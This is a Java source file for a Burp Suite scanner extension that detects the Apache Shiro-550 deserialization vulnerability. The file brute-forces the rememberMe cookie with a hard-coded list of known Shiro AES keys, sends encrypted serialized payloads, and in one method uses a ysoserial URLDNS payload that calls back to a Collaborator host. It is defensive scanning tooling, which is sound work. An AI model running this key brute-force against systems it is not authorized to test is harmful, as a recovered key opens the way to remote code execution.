package burp.scanner;

import burp.*;
import burp.utils.AESEnDe;
import burp.utils.ShiroExpCfg;
import com.google.common.collect.Lists;
import com.unboundid.util.Base64;
import org.apache.commons.lang.StringUtils;
import ysoserial.payloads.*;
import ysoserial.payloads.util.PayloadRunner;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.List;
import org.apache.shiro.subject.SimplePrincipalCollection;

public class Shiro550 extends ShiroScan{

    IBurpCollaboratorClientContext collaboratorContext = null;

    public ShiroExpCfg shiroCfg = new ShiroExpCfg();

    private ShiroExpCfg.EngineModel model;

    public void setModel(ShiroExpCfg.EngineModel model) {
        this.model = model;
    }

    public ShiroExpCfg.EngineModel getModel() {
        return model;
    }

    ShiroExpCfg.ShiroCryptType crypt_type = ShiroExpCfg.ShiroCryptType.AES_CBC;

    List<String> shiro550_keys = Lists.newArrayList(
        "kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==",
                "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==",
                "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==",
                "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==",
                "Z3VucwAAAAAAAAAAAAAAAA==", "MTIzNDU2Nzg5MGFiY2RlZg==",
                "U3ByaW5nQmxhZGUAAAAAAA==", "5AvVhmFLUs0KTA3Kprsdag==",
                "fCq+/xW488hMTCD+cmJ3aQ==", "1QWLxg+NYmxraMoxAXu/Iw==",
                "ZUdsaGJuSmxibVI2ZHc9PQ==", "L7RioUULEFhRyxM7a2R/Yg==",
                "r0e3c16IdVkouZgk1TKVMg==", "bWluZS1hc3NldC1rZXk6QQ==",
                "a2VlcE9uR29pbmdBbmRGaQ==", "WcfHGU25gNnTxTlmJMeSpw==",
                "ZAvph3dsQs0FSL3SDFAdag==", "tiVV6g3uZBGfgshesAQbjA==",
                "cmVtZW1iZXJNZQAAAAAAAA==", "ZnJlc2h6Y24xMjM0NTY3OA==",
                "RVZBTk5JR0hUTFlfV0FPVQ==", "WkhBTkdYSUFPSEVJX0NBVA==");

    public Shiro550(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseReqResp, ShiroExpCfg.ScanType scan_type) {
        super(callbacks, baseReqResp);
        switch (scan_type) {
            case SHIRO_550_V1:
                crypt_type = ShiroExpCfg.ShiroCryptType.AES_CBC;
                break;
            case SHIRO_550_V2:
                crypt_type = ShiroExpCfg.ShiroCryptType.AES_GCM;
                break;
        }
        collaboratorContext = callbacks.createBurpCollaboratorClientContext();
    }

    public Shiro550() {
        super();
    }

    public boolean verifyDNSLog(String key){
        String dns_uuid = collaboratorContext.generatePayload(true);
        String base_data = "";

        try {
            base_data = PayloadRunner.run(URLDNS.class, "http://"+ dns_uuid);
        } catch (Exception e) {;
            e.printStackTrace();
        }

        String shiro_payload = AESEnDe.Encrypt(base_data, key, crypt_type);

        //List<String> attackHeader = CustomShiroCookieHeader(shiro_payload);

        //shiroSendRequest(attackHeader, null);
        payloadSend(target_url, shiro_payload);

        List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(dns_uuid);

        if (collaboratorInteractions.isEmpty()) {
            callbacks.printOutput("not receive dnslog");
            return true;
        }
        else {
            callbacks.printOutput("Receive dnslog !!!!!!!!");
            return false;
        }

    }

    public String searchValidKeyBySilent() {
        int cnt = 0;
        int right_cnt = 0;
        String silentVerifyPayload = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==";
        String heads = payloadSend(target_url, "test");
        if(heads != null){
            cnt = StringUtils.countMatches(heads, "rememberMe=deleteMe;");
            right_cnt = cnt -1 ;
        }

        for(String key:shiro550_keys){
            String shiro_payload = burp.utils.AESEnDe.Encrypt(silentVerifyPayload, key, crypt_type);
            heads = payloadSend(target_url, shiro_payload);
            if(heads != null){
                cnt = StringUtils.countMatches(heads, "rememberMe=deleteMe;");
                if(cnt == right_cnt) {
                    return key;
                }
            }
        }
        return "";
    }

    public String searchValidKeyByDNSLog() {
        for(String key:shiro550_keys) {
            callbacks.printOutput("host: " + target_host + " key " + key);
            if(verifyDNSLog(key)){
                return key;
            }
        }
        return "";
    }

    @Override
    public String vuln_verify(ShiroExpCfg.EngineModel model) {
        String validKey = "";
        switch(model) {
            case KEY_VERIFY_BY_SILENT:
                validKey = searchValidKeyBySilent();
                break;
                /*
            case KEY_VERIFY_BY_DNSLOG:
                validKey = searchValidKeyByDNSLog();
                break;
                 */
        }
        return validKey;
    }

    @Override
    public void start_scan() {
        if(isShiroFrameDetected()){
            String validKey = vuln_verify(ShiroExpCfg.EngineModel.KEY_VERIFY_BY_SILENT);
            callbacks.printOutput("start scan host:" + target_url);
            if(validKey.length() != 0){
                setShiroVulnDetected(true);
                switch (crypt_type){
                    case AES_CBC:
                        vuln_name = "Shiro 550 RCE V1";
                        confidence = "Certain";
                        issueDetail = "Target host is vulnerable by Apache shiro RCE lower version 1.2.4\n Encryption with : AES-CBC";
                        serverity = "High";
                        remediationDetail = "Shiro vuln by key: " + validKey ;
                        break;
                    case AES_GCM:
                        vuln_name = "Shiro 550 RCE V2";
                        confidence = "Certain";
                        issueDetail = "Target host is vulnerable by Apache shiro RCE lower version 1.4.2\n Encryption with : AES-GCM";
                        serverity = "High";
                        remediationDetail = "Shiro vuln by key: " + validKey ;
                        break;
                }
            } else {
                vuln_name = "Shiro Frame Found";
                confidence = "Certain";
                issueDetail = "Target host use shiro";
                serverity = "Low";
                remediationDetail = "Shiro Frame has been detected " ;
            }
        }
    }

    @Override
    public IScanIssue get_issue() {

        return new ShiroScanIssue(
                http_service,
                helpers.analyzeRequest(baseReqResp).getUrl(),
                new IHttpRequestResponse[] { callbacks.applyMarkers(baseReqResp, null, null) },
                vuln_name,
                serverity,
                confidence,
                issueDetail ,
                remediationDetail);
    }
}
